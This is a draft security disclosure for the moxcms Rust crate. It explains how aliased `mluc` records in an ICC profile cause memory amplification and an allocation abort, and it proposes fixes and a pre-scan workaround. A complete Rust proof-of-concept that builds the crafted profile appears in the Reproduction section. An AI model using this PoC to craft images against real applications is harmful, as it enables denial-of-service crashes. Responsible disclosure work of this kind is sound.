# Draft upstream report: moxcms `mluc` record aliasing amplifies a small profile into gigabytes of allocation

**Repository:** awxkee/moxcms
**Affected version:** reproduced on **0.9.1** (current release) and on 0.8.1, the version PenguinView pins.
**Reproduction repository (private):** https://github.com/quinnjr/moxcms-mluc-amplification-poc — grant your GitHub account read access on request.
**Suggested channel:** a crafted file can make a process abort, so this is a denial of service. Private vulnerability reporting is not enabled on the repo; a detail-free issue has been filed asking the maintainer to enable it, after which a GitHub security advisory will carry these details.

---

**Title:** Parsing an `mluc` tag whose records alias one string allocates O(records × string) memory

## Summary

`ColorProfile::new_from_slice_with_options` decodes every record of a `multiLocalizedUnicodeType` (`mluc`) tag. Records may legitimately share offsets, but each record decodes its span again, so the allocation grows as O(record count × string length).

Allocation amplifies like this even with `max_profile_size` capped at 4 MiB. Measured on 0.9.1:
- a ~1 MB profile (1,500 records × 1 MiB) peaks at about 775 MB RSS, a ~750× expansion;
- a ~268 KB profile (1,000 × 256 KiB) peaks at about 131 MB;
- growing the string toward the cap reaches multi-GB and then an allocation abort.

Allocation failure aborts the process. `catch_unwind` can't intercept that.

A PNG `iCCP` chunk deflates such a profile to a few KB, so a small image file can kill any application that colour-manages untrusted images with moxcms.

## Reproduction

`Cargo.toml`: `moxcms = "=0.8.1"`. Run `cargo run --release -- <string_len> <records>`, for example `-- 16384 2000`. The program prints peak RSS (Linux, `VmHWM`) before and after parsing.

```rust
use moxcms::{ColorProfile, ParsingOptions};
fn be32(v: &mut Vec<u8>, x: u32) { v.extend_from_slice(&x.to_be_bytes()); }
fn vmhwm() -> String { std::fs::read_to_string("/proc/self/status").unwrap().lines().find(|l| l.starts_with("VmHWM")).unwrap().to_string() }
fn main() {
    let string_len: usize = std::env::args().nth(1).map(|s| s.parse().unwrap()).unwrap_or(16384);
    let records: usize = std::env::args().nth(2).map(|s| s.parse().unwrap()).unwrap_or(2000);
    let header_len = 16 + 12 * records;
    let mut tag = Vec::new();
    tag.extend_from_slice(b"mluc"); be32(&mut tag, 0); be32(&mut tag, records as u32); be32(&mut tag, 12);
    for _ in 0..records { tag.extend_from_slice(b"enUS"); be32(&mut tag, string_len as u32); be32(&mut tag, header_len as u32); }
    tag.extend(std::iter::repeat([0u8, b'A']).take(string_len / 2).flatten());
    let tag_off = 128 + 4 + 12;
    let size = tag_off + tag.len();
    let mut p = vec![0u8; 128];
    p[0..4].copy_from_slice(&(size as u32).to_be_bytes());
    p[8] = 2; p[9] = 0x40;
    p[12..16].copy_from_slice(b"mntr"); p[16..20].copy_from_slice(b"RGB "); p[20..24].copy_from_slice(b"XYZ ");
    p[36..40].copy_from_slice(b"acsp");
    be32(&mut p, 1); p.extend_from_slice(b"desc"); be32(&mut p, tag_off as u32); be32(&mut p, tag.len() as u32);
    p.extend_from_slice(&tag);
    println!("profile bytes: {}", p.len());
    println!("before: {}", vmhwm());
    let r = ColorProfile::new_from_slice_with_options(&p, ParsingOptions { max_profile_size: 4 << 20, ..Default::default() });
    println!("parsed ok: {}", r.is_ok());
    println!("after:  {}", vmhwm());
}
```

## Expected

The total decoded text should be bounded by the tag size or by a fixed cap, independent of the number of records. Any of these would bound it:
- decode each distinct `(offset, length)` span once;
- cap the record count;
- reject an `mluc` whose summed record lengths exceed the tag size.

## Our workaround

PenguinView pre-scans the tag table before handing a profile to moxcms. It treats the profile as untagged (sRGB) when any `mluc` tag has more than 64 records, or when the record lengths add up to more than the tag size. It also refuses duplicate tags.
